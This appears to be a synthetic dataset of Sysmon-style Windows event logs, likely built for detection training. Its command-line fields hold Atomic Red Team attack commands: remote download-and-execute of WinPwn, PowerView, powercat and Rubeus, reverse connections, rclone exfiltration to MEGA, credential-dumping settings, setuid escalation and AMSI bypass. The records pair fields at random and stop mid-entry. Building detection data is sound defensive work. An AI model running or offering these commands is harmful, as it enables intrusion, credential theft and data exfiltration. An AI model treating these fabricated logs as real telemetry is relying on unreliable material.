    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-95.ramos.biz",
        "User": "cookwilliam",
        "ProcessID": 3242,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"which_python=$(which python || which python3 || which python3.9 || which python2)\\n$which_python -c 'import requests;import os;url = \\\"#{script_url}\\\";malicious_command = \\\"#{executor} #{payload_file_name} #{script_args}\\\";session = requests.session();source = session.get(url).content;fd = open(\\\"#{payload_file_name}\\\", \\\"wb+\\\");fd.write(source);fd.close();os.system(malicious_command)'\\n\",",
        "LogonID": 610158,
        "LogonGuid": "5b800d6c-2193-401c-b194-1353fed11328",
        "SourceProcessID": 5997,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\put..exe",
        "DestinationProcessID": 9662,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\arm..exe",
        "UtcTime": "2024-05-17T01:36:51.850065Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-05.scott.com",
        "User": "harperlaura",
        "ProcessID": 8615,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"cmdkey /list\\n\",",
        "LogonID": 599410,
        "LogonGuid": "99b8ed64-04d3-4dc6-8a2e-02c6b85407bb",
        "SourceProcessID": 7431,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\trip..dll",
        "DestinationProcessID": 8990,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\week..dll",
        "UtcTime": "2024-05-17T01:36:51.850065Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-66.crane.com",
        "User": "john83",
        "ProcessID": 8625,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"reg add HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 336402,
        "LogonGuid": "d06e5476-7074-4ab3-bd36-1b349d519d78",
        "SourceProcessID": 5693,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\general..exe",
        "DestinationProcessID": 2629,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\same..dll",
        "UtcTime": "2024-05-17T01:36:51.850065Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-83.morgan.com",
        "User": "allisonnielsen",
        "ProcessID": 9426,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nbrowserpwn -consoleoutput -noninteractive\",",
        "LogonID": 808460,
        "LogonGuid": "7c0baf78-ccca-4053-a19d-6d415196754c",
        "SourceProcessID": 8249,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\hand..dll",
        "DestinationProcessID": 5721,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\think..exe",
        "UtcTime": "2024-05-17T01:36:51.851065Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-34.young.com",
        "User": "kwilliams",
        "ProcessID": 5974,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'\\n\",",
        "LogonID": 603533,
        "LogonGuid": "663795cf-804e-404e-ba45-d099382f96b4",
        "SourceProcessID": 6989,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\agent..dll",
        "DestinationProcessID": 4521,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\like..dll",
        "UtcTime": "2024-05-17T01:36:51.851065Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-23.adams.biz",
        "User": "nclark",
        "ProcessID": 5185,
        "ProcessName": "malware.exe",
        "CommandLine": "\"takeown.exe /f #{file_folder_to_own} /r\\n\",",
        "LogonID": 209229,
        "LogonGuid": "0455324e-1e17-4dfd-8d5e-03dd8e7846f3",
        "SourceProcessID": 2197,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\simply..dll",
        "DestinationProcessID": 7705,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\plant..exe",
        "UtcTime": "2024-05-17T01:36:51.851065Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-13.burnett.net",
        "User": "cboone",
        "ProcessID": 3838,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Copy-Item \\\"$PathToAtomicsFolder\\\\T1546.011\\\\bin\\\\T1546.011CompatDatabase.sdb\\\" C:\\\\Windows\\\\apppatch\\\\Custom\\\\T1546.011CompatDatabase.sdb\\nCopy-Item \\\"$PathToAtomicsFolder\\\\T1546.011\\\\bin\\\\T1546.011CompatDatabase.sdb\\\" C:\\\\Windows\\\\apppatch\\\\Custom\\\\Custom64\\\\T1546.011CompatDatabase.sdb\\n\",",
        "LogonID": 259100,
        "LogonGuid": "69bf443f-cf5c-4432-aac8-bb308495154a",
        "SourceProcessID": 4667,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\less..exe",
        "DestinationProcessID": 8224,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\business..exe",
        "UtcTime": "2024-05-17T01:36:51.852067Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-15.dorsey.com",
        "User": "jamesjohnson",
        "ProcessID": 1080,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"cp #{payload} /tmp/hello.c\\nsudo chown root /tmp/hello.c\\nsudo make /tmp/hello\\nsudo chown root /tmp/hello\\nsudo chmod u+s /tmp/hello\\n/tmp/hello\\n\",",
        "LogonID": 725727,
        "LogonGuid": "47553611-77a9-4da3-9fe9-13fb8155d6b5",
        "SourceProcessID": 9683,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\dinner..exe",
        "DestinationProcessID": 3243,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\now..exe",
        "UtcTime": "2024-05-17T01:36:51.852067Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-10.lopez.biz",
        "User": "angelaboyer",
        "ProcessID": 7005,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/\\ndocker run --name t1046_container  -d -t t1046\\ndocker exec t1046_container ./test.sh\",",
        "LogonID": 706435,
        "LogonGuid": "39fc5a98-0acd-47af-bae6-3878862d280f",
        "SourceProcessID": 8093,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\deep..dll",
        "DestinationProcessID": 2484,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\admit..exe",
        "UtcTime": "2024-05-17T01:36:51.852067Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-06.stewart-reyes.net",
        "User": "david15",
        "ProcessID": 9130,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\\npowercat -c #{server_ip} -p #{server_port}\\n\",",
        "LogonID": 790310,
        "LogonGuid": "bcb31bca-c306-4e21-be30-378b83565cd6",
        "SourceProcessID": 4428,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\truth..dll",
        "DestinationProcessID": 4279,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\set..dll",
        "UtcTime": "2024-05-17T01:36:51.852067Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-31.davis-rodriguez.biz",
        "User": "sanchezalexa",
        "ProcessID": 1561,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\AU\\\" /v \\\"NoAutoUpdate\\\" /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 561981,
        "LogonGuid": "dbe0bc23-4e48-47f2-a95a-28f6ae904e67",
        "SourceProcessID": 4621,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\such..dll",
        "DestinationProcessID": 9701,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\every..exe",
        "UtcTime": "2024-05-17T01:36:51.853067Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-35.ramos.info",
        "User": "wbradley",
        "ProcessID": 2395,
        "ProcessName": "malware.exe",
        "CommandLine": "\"New-Item #{rclone_config_path}\\\\rclone -ItemType directory\\nNew-Item #{rclone_config_path}\\\\rclone\\\\rclone.conf\\ncd \\\"#{rclone_path}\\\"\\n.\\\\rclone.exe config create #{remote_share} mega\\nset-Content #{rclone_config_path}\\\\rclone\\\\rclone.conf \\\"[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}\\\"\\n.\\\\rclone.exe copy --max-size 1700k \\\"#{dir_to_copy}\\\" #{remote_share}:test -v\\n\",",
        "LogonID": 476854,
        "LogonGuid": "df22c3bc-e2be-4f4e-9315-47b63b891afc",
        "SourceProcessID": 9784,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\not..exe",
        "DestinationProcessID": 4761,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\laugh..exe",
        "UtcTime": "2024-05-17T01:36:51.853067Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-20.thompson-carter.com",
        "User": "myerskaren",
        "ProcessID": 5439,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ \\ndocker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh\\ndocker exec -i t1609_container bash -c \\\"cat /tmp/output.txt\\\"\\n\",",
        "LogonID": 150119,
        "LogonGuid": "3414d1ad-5c56-41c4-a283-b78454b85328",
        "SourceProcessID": 3605,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\agent..dll",
        "DestinationProcessID": 4610,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\century..exe",
        "UtcTime": "2024-05-17T01:36:51.853067Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-16.anderson.com",
        "User": "leemelissa",
        "ProcessID": 4522,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"poweroff --reboot\\n\",",
        "LogonID": 140050,
        "LogonGuid": "8dbe4f9c-937e-4308-8b73-5b5799fd2c09",
        "SourceProcessID": 5467,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\sort..dll",
        "DestinationProcessID": 2869,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\hotel..dll",
        "UtcTime": "2024-05-17T01:36:51.853067Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-43.duncan.info",
        "User": "pennyhorn",
        "ProcessID": 4995,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg ADD \\\"HKCR\\\\CLSID\\\\{645FF040-5081-101B-9F08-00AA002F954E}\\\\shell\\\\open\\\\command\\\" /ve /d \\\"calc.exe\\\" /f\",",
        "LogonID": 481185,
        "LogonGuid": "071b3f5e-8990-4236-8238-e8652c9f3b4a",
        "SourceProcessID": 9769,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\record..exe",
        "DestinationProcessID": 5964,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\laugh..dll",
        "UtcTime": "2024-05-17T01:36:51.854069Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-39.nelson.org",
        "User": "natalie95",
        "ProcessID": 1980,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"kubectl get cronjobs -n #{namespace}\\n\",",
        "LogonID": 984992,
        "LogonGuid": "94b09515-d070-405f-9709-da123917d5b5",
        "SourceProcessID": 9918,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\from..exe",
        "DestinationProcessID": 2368,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\seek..dll",
        "UtcTime": "2024-05-17T01:36:51.854069Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-15.rodriguez.com",
        "User": "emilybrewer",
        "ProcessID": 4092,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\AU\\\" /v \\\"NoAutoRebootWithLoggedOnUsers\\\" /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 969511,
        "LogonGuid": "bf2c5d0a-4557-48d8-b3ee-43c202c7a10d",
        "SourceProcessID": 7799,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\identify..exe",
        "DestinationProcessID": 9220,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\system..dll",
        "UtcTime": "2024-05-17T01:36:51.854578Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-11.dudley-spence.com",
        "User": "haydenanthony",
        "ProcessID": 7679,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"sudo #{program_path} -f -i #{ifname} -t 3\\n\",",
        "LogonID": 370290,
        "LogonGuid": "9ddcb945-e23e-431c-928a-570fe446a2d1",
        "SourceProcessID": 2107,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\new..exe",
        "DestinationProcessID": 1860,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\shoulder..exe",
        "UtcTime": "2024-05-17T01:36:51.854578Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-24.mccoy.com",
        "User": "wbaxter",
        "ProcessID": 7467,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$url = \\\"#{url_of_wallpaper}\\\"\\n$imgLocation = \\\"#{wallpaper_location}\\\"\\n$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\\\Control Panel\\\\Desktop\\\\' -Name WallPaper).WallPaper\\n$orgWallpaper | Out-File -FilePath \\\"#{pointer_to_orginal_wallpaper}\\\"\\n$updateWallpapercode = @' \\nusing System.Runtime.InteropServices; \\nnamespace Win32{\\n\\n    public class Wallpaper{ \\n        [DllImport(\\\"user32.dll\\\", CharSet=CharSet.Auto)] \\n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \\n         \\n         public static void SetWallpaper(string thePath){ \\n            SystemParametersInfo(20,0,thePath,3); \\n        }\\n    }\\n} \\n'@\\n$wc = New-Object System.Net.WebClient  \\ntry{  \\n    $wc.DownloadFile($url, $imgLocation)\\n    add-type $updateWallpapercode \\n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\\n} \\ncatch [System.Net.WebException]{  \\n    Write-Host(\\\"Cannot download $url\\\") \\n    add-type $updateWallpapercode \\n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\\n} \\nfinally{    \\n    $wc.Dispose()  \\n}\\n\",",
        "LogonID": 842047,
        "LogonGuid": "beb924bb-9fe4-461b-9fb0-7a17ec07a064",
        "SourceProcessID": 9360,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\television..exe",
        "DestinationProcessID": 7239,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\short..dll",
        "UtcTime": "2024-05-17T01:36:51.854578Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-54.white-harris.org",
        "User": "mark67",
        "ProcessID": 4651,
        "ProcessName": "nc.exe",
        "CommandLine": "\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend /v 1 /d \\\"#{thing_to_execute}\\\"\\n\",",
        "LogonID": 472660,
        "LogonGuid": "bf3727bf-0033-46d3-891b-03bdbee416d3",
        "SourceProcessID": 6922,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\second..exe",
        "DestinationProcessID": 9090,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\expect..exe",
        "UtcTime": "2024-05-17T01:36:51.854578Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-63.palmer.org",
        "User": "bedwards",
        "ProcessID": 1384,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose\\n\",",
        "LogonID": 519629,
        "LogonGuid": "492c94cd-adfc-47b5-b5cc-5e30ae939e65",
        "SourceProcessID": 3044,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\different..dll",
        "DestinationProcessID": 2737,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\establish..dll",
        "UtcTime": "2024-05-17T01:36:51.854578Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-35.duffy.com",
        "User": "scottmontoya",
        "ProcessID": 6585,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Add-Type -AssemblyName System.Windows.Forms\\n$screen = [Windows.Forms.SystemInformation]::VirtualScreen\\n$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height\\n$graphic = [Drawing.Graphics]::FromImage($bitmap)\\n$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)\\n$bitmap.Save(\\\"#{output_file}\\\")\\n\",",
        "LogonID": 581756,
        "LogonGuid": "91636826-1c5c-42e0-a60b-6da200c12e1e",
        "SourceProcessID": 1293,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\various..exe",
        "DestinationProcessID": 2070,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\let..dll",
        "UtcTime": "2024-05-17T01:36:51.855586Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-95.floyd.com",
        "User": "shannonjamie",
        "ProcessID": 2670,
        "ProcessName": "nc.exe",
        "CommandLine": "\"touch #{file_to_setuid}\\nchown root #{file_to_setuid}\\nchmod u+xs #{file_to_setuid}\\n\",",
        "LogonID": 126531,
        "LogonGuid": "f11f704a-0d08-48c4-97b6-09d1d35f9883",
        "SourceProcessID": 9108,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\machine..dll",
        "DestinationProcessID": 6921,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\bad..dll",
        "UtcTime": "2024-05-17T01:36:51.855586Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-01.moreno.info",
        "User": "iwhite",
        "ProcessID": 1726,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"# Set the remote computer name and credentials\\n $RemoteComputer = \\\"#{dest}\\\"\\n $PWord = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\n\\n # Create a CIM session\\n $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential\\n\\n # Define the process you want to start\\n $ProcessToStart = \\\"#{process}\\\"\\n\\n # Invoke the Create method on the Win32_Process class to start the process\\n $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}\\n\\n # Check the result\\n if ($Result.ReturnValue -eq 0) {\\n     Write-Host \\\"Process started successfully with Process ID: $($Result.ProcessId)\\\"\\n } else {\\n     Write-Host \\\"Failed to start the process. Error code: $($Result.ReturnValue)\\\"\\n }\\n\\n # Clean up the CIM session\\n Remove-CimSession -CimSession $CimSession \\n\",",
        "LogonID": 303124,
        "LogonGuid": "e31c04cb-f339-4e7f-b98b-41fa5e9bf4c1",
        "SourceProcessID": 4899,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\Mr..dll",
        "DestinationProcessID": 3741,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\edge..exe",
        "UtcTime": "2024-05-17T01:36:51.855586Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-06.salazar.com",
        "User": "yayala",
        "ProcessID": 1385,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"copy %windir%\\\\System32\\\\windowspowershell\\\\v1.0\\\\powershell.exe %APPDATA%\\\\updater.exe\\ncopy %windir%\\\\System32\\\\amsi.dll %APPDATA%\\\\amsi.dll\\n%APPDATA%\\\\updater.exe -Command exit\\n\",",
        "LogonID": 400724,
        "LogonGuid": "0d6f0c08-cccf-4ce7-acec-e8fd6e5e8984",
        "SourceProcessID": 6285,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\wait..dll",
        "DestinationProcessID": 7871,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\skin..exe",
        "UtcTime": "2024-05-17T01:36:51.855586Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-30.sims.com",
        "User": "pmorgan",
        "ProcessID": 5407,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"launchctl submit -l #{label_name} -- #{executable_path}\\n\",",
        "LogonID": 276859,
        "LogonGuid": "e1e286ae-1757-45b6-be0c-81772722005e",
        "SourceProcessID": 1121,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\well..exe",
        "DestinationProcessID": 6431,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\meeting..dll",
        "UtcTime": "2024-05-17T01:36:51.855586Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-87.holmes-huber.com",
        "User": "robert49",
        "ProcessID": 1582,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"ip neighbour show\\n\",",
        "LogonID": 194435,
        "LogonGuid": "d03df697-6a83-4cee-95c3-d1f02712543b",
        "SourceProcessID": 7369,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\suggest..exe",
        "DestinationProcessID": 8302,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\yes..exe",
        "UtcTime": "2024-05-17T01:36:51.855586Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-66.hamilton-pena.net",
        "User": "bfrench",
        "ProcessID": 7621,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\\n. \\\"#{test_harness}\\\"\\n\\n$InstallerAssemblyDir = \\\"#{assembly_dir}\\\"\\n$InstallerAssemblyFileName = \\\"#{assembly_filename}\\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\\"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\\\"$InstallerAssemblyFullPath`\\\"\\\"\\n$ExpectedOutput = 'Constructor_Install_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\\"\\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\\"@\\n}\\n\",",
        "LogonID": 291100,
        "LogonGuid": "654e2a9e-7e5e-4d81-be62-0073f14538f1",
        "SourceProcessID": 2592,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\soldier..dll",
        "DestinationProcessID": 5652,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\bill..dll",
        "UtcTime": "2024-05-17T01:36:51.856587Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-13.morgan.org",
        "User": "dwang",
        "ProcessID": 6997,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$notepad = Start-Process notepad -passthru\\nStart-Process \\\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\InjectView.exe\\\"\\n\",",
        "LogonID": 135558,
        "LogonGuid": "d9ed048f-5474-44d0-b5f6-9128fcfaee89",
        "SourceProcessID": 3732,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\interesting..dll",
        "DestinationProcessID": 3078,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\real..exe",
        "UtcTime": "2024-05-17T01:36:51.856587Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-64.watts-bond.org",
        "User": "jeffrey35",
        "ProcessID": 2140,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"pktmon.exe filter add -p 445\\n\",",
        "LogonID": 177295,
        "LogonGuid": "061c2f73-346a-4d2d-9a90-29fb2e1c9fa2",
        "SourceProcessID": 8839,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\guess..exe",
        "DestinationProcessID": 4966,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\boy..exe",
        "UtcTime": "2024-05-17T01:36:51.856587Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-05.shaw.net",
        "User": "bryan41",
        "ProcessID": 1017,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"NOW=$(date +%m%d%H%M%Y)\\ndate 010100001971\\ntouch #{target_filename}\\ndate \\\"$NOW\\\"\\nstat #{target_filename}\\n\",",
        "LogonID": 912678,
        "LogonGuid": "905c4cbb-c5cf-4695-9414-27c73440fc1e",
        "SourceProcessID": 5301,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\writer..exe",
        "DestinationProcessID": 9322,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\west..dll",
        "UtcTime": "2024-05-17T01:36:51.856587Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-37.mann.info",
        "User": "robert03",
        "ProcessID": 3036,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sudo sed -i \\\"#{index}s,^,#{pam_rule}\\\\n,g\\\" #{path_to_pam_conf}\\n\",",
        "LogonID": 425715,
        "LogonGuid": "d2148f1c-dd12-4e3b-8bf6-91c5ca748364",
        "SourceProcessID": 3736,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\hear..exe",
        "DestinationProcessID": 7694,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\deal..exe",
        "UtcTime": "2024-05-17T01:36:51.856587Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-33.moses.com",
        "User": "sjames",
        "ProcessID": 5200,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"cd /tmp\\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\\ncd /tmp/GoAWSConsoleSpray\\ngo run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt\\n\",",
        "LogonID": 698233,
        "LogonGuid": "7b08c856-9652-4616-8408-8030d384cff4",
        "SourceProcessID": 5170,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\I..exe",
        "DestinationProcessID": 1908,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\owner..dll",
        "UtcTime": "2024-05-17T01:36:51.857586Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-49.solomon.org",
        "User": "kristina71",
        "ProcessID": 9876,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\\nInvoke-Rubeus -Command \\\"asreproast /format:hashcat /nowrap\\\"\",",
        "LogonID": 527772,
        "LogonGuid": "f8dcb042-7d10-4026-ac19-25312138f1f1",
        "SourceProcessID": 1126,
        "SourceProcessName": "malware.exe",
